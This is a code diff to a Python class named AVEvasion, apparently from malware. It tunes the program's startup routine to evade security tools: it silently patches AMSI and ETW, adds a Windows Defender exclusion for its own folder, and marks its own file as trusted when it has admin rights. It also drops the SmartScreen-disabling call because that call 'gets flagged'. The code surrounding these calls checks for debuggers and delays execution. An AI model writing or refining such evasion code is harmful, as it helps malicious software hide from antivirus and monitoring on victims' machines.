@@ -556,7 +556,7 @@ class AVEvasion:
     @staticmethod
     def run_all_evasions():
         """
-        Run all evasion techniques at startup
+        Run all evasion techniques at startup (stealthy mode)
         Returns: True if safe to continue, False if should exit
         """
         # Check for debugger first
@@ -571,15 +571,21 @@ class AVEvasion:
             delay_time = min(60 + (score * 20), 180)  # 60-180 seconds
             AVEvasion.delay_execution(delay_time)
 
-        # Patch AMSI and ETW
-        AVEvasion.patch_amsi()
-        AVEvasion.patch_etw()
+        # Patch AMSI and ETW (silent, no admin needed)
+        try:
+            AVEvasion.patch_amsi()
+            AVEvasion.patch_etw()
+        except:
+            pass
 
-        # Try to add exclusions and disable SmartScreen if admin
+        # Only try quiet evasions if admin (don't request it)
         if AVEvasion.is_admin():
-            current_path = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
-            AVEvasion.add_defender_exclusion(os.path.dirname(current_path))
-            AVEvasion.disable_smartscreen()
-            AVEvasion.mark_file_as_trusted(current_path)
+            try:
+                current_path = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
+                AVEvasion.add_defender_exclusion(os.path.dirname(current_path))
+                AVEvasion.mark_file_as_trusted(current_path)
+                # Note: Not calling disable_smartscreen() - too noisy and gets flagged
+            except:
+                pass
 
         return True
